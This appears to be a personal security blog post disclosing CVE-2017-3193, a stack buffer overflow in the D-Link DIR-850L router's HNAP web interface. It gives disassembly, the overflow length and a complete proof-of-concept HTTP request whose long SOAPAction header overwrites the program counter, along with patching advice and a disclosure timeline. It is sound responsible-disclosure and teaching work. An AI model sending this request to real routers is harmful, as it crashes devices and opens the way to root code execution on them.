<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>zlowram's blog</title>
        <link href="/css/style.css" rel="stylesheet">
        <link href="/css/prism.css" rel="stylesheet" />
		<meta name="description" content="Yet another blog of another infosec enthusiast. CTFs, reversing, exploiting, coding and more.">
		<meta name="keywords" content="hacking, CTF, write-up, exploiting, reversing">
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

		  ga('create', 'UA-93249230-1', 'auto');
		  ga('send', 'pageview');

		</script>
    </head>
    <body>

        <div class="container">

            <div class="site-nav">

            </div><!-- /.site-nav -->

            <div class="site-header">
                <pre>
          $$\                                                          
          $$ |                                                         
$$$$$$$$\ $$ | $$$$$$\  $$\  $$\  $$\  $$$$$$\  $$$$$$\  $$$$$$\$$$$\  
\____$$  |$$ |$$  __$$\ $$ | $$ | $$ |$$  __$$\ \____$$\ $$  _$$  _$$\ 
  $$$$ _/ $$ |$$ /  $$ |$$ | $$ | $$ |$$ |  \__|$$$$$$$ |$$ / $$ / $$ |
 $$  _/   $$ |$$ |  $$ |$$ | $$ | $$ |$$ |     $$  __$$ |$$ | $$ | $$ |
$$$$$$$$\ $$ |\$$$$$$  |\$$$$$\$$$$  |$$ |  <span class="title-dot">$$\</span>\$$$$$$$ |$$ | $$ | $$ |
\________|\__| \______/  \_____\____/ \__|  <span class="title-dot">\__|</span>\_______|\__| \__| \__|
                </pre>
            </div><!-- /.site-header -->

            <div class="row">
                <div class="nav-bar">
                    --| <a href="/">Blog</a> | <a href="/etc/whoami/">Whoami</a> |--
                </div><!-- /.nav-bar -->

                <div class="blog-post">
                    <h2 class="post-title">CVE-2017-3193 Write-up </h2>
                    
                    <p class="post-meta">by zlowram on March 15, 2017</p> 
                    
                    <p>Back in december, I discovered a vulnerability on the D-LINK DIR-850L router that allowed to execute arbitrary code on the affected device, as root. However, I could not publish anything about it until the responsible disclosure process was done, and so it is.</p>

<p>The vulnerability affects the firmware version 2.07 Build 5 and earlier, and could possibly affect other D-LINK routers since they use to reuse firmware code in their devices. Additionally, it is worth saying that, with the default router configuration, the vulnerability can only be exploited from the LAN and Wi-Fi interfaces. However, if the device&rsquo;s remote management option is enabled, it will also be exploitable from the WAN interface.</p>

<h2>Details</h2>

<p>The affected service is the management web interface, specifically the cgibin file located within the htdocs folder on the router filesystem. The vulnerability is a Stack-Based Buffer Overflow, caused by a non-controlled use of the strcat() function that allows an overwrite of the PC, and thus change the execution flow of the program, allowing arbitrary code execution.</p>

<p>The call to strcat that is causing the Buffer Overflow is located at the offset 0x414a20. From the arguments passed to strcat the first (destination) corresponds to the second part of the HNAP_AUTH header, and the second (source) corresponds to the content of the SOAPAction header. If the size of the content of the SOAPAction plus the second part of the HNAP_AUTH header is more than 547 bytes, it will overflow and the following 4 overwritten bytes will correspond to the stored PC within the stack.</p>

<pre><code class="language-markup">0x00414130 8f998410 lw t9, -0x7bf0(gp) ; [0x43ad50:4]=0x4251e0 sym.imp.getenv 
0x00414134 0320f809 jalr t9 
0x00414138 24847dac addiu a0, a0, 0x7dac ; HTTP_SOAPACTION 
0x0041413c 3c040042 lui a0, 0x42 
0x00414140 8fbc0020 lw gp, 0x20(sp) 
0x00414144 2484615c addiu a0, a0, 0x615c 
0x00414148 8f998410 lw t9, -0x7bf0(gp) ; [0x43ad50:4]=0x4251e0 sym.imp.getenv 
0x0041414c 0320f809 jalr t9 
0x00414150 00408821 move s1, v0 ; HTTP_SOAPACTION saved to s1

...

0x00414a14 02402021 move a0, s2 ; arg1 (dest) 
0x00414a18 8fbc0020 lw gp, 0x20(sp) 
0x00414a1c 8f9982b0 lw t9, -0x7d50(gp) ; [0x43abf0:4]=0x4253e0 sym.imp.strcat 
0x00414a20 0320f809 jalr t9 ; Call to strcat 
0x00414a24 02202821 move a1, s1 ; arg2 (src) 
</code></pre>

<p>The following request is a Proof of Concept that will cause the process to crash, by overwriting the PC with the value 0x41414141. Note that the following is a modification of a legitimate request and that not all the headers are necessary to cause the crash.</p>

<pre><code class="language-markup">POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAA
HNAP_AUTH: BBD0605AF8690024AF8568BE88DD7B8E 1482588069
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/info/Login.html
Content-Length: 306
Cookie: uid=kV8BSOXCoc
Connection: close
</code></pre>

<p>This vulnerability has been assigned the CVE number CVE-2017-3193, which turns out to be my first vulnerability with CVE, which makes me quite happy!</p>

<h2>Recommendation</h2>

<p>If you happen to have the vulnerable device with a vulnerable firmware version (which is very likely if you don&rsquo;t usually update your devices), I recommend to check whether you have the remote management option enabled and disable it as soon as possible. After that, make sure to update your device by installing the latest version of the firmware that fixes this vulnerability, which can be found in <a href="http://support.dlink.com/ProductInfo.aspx?m=DIR-850L">D-LINK&rsquo;s official site</a>.</p>

<h2>Resolution timeline</h2>

<ul>
<li>Discovered: 24 December 2016</li>
<li>Reported: 04 January 2017</li>
<li>Fixed: 16 February 2017</li>
<li>Published (<a href="https://www.kb.cert.org/vuls/id/305448">CERT Advisory</a>): 08 March 2017</li>
</ul>

<p>I would like to thank <a href="http://twitter.com/daniel_rome">Daniel Romero</a>, <a href="http://twitter.com/nighterman">Nighterman</a> and <a href="http://twitter.com/revskills">revskills</a> for their tips and support! Pwn&amp;Swag</p>

                    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
var disqus_shortname = 'nopatch'; // required: replace example with your forum shortname
var disqus_identifier = '/2017/3/15/cve-2017-3193-write-up/';

/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
 var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
 dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

                </div><!-- /.blog-post -->

            </div><!-- /.row -->

        </div><!-- /.container -->
        <div class="footer">
            Powered by <a href="http://github.com/zlowram/blgo">blgo</a> 
        </div><!-- /.footer -->

        <!-- Prism.js -->
        <script src="/js/prism.js"></script>
    </body>
</html>
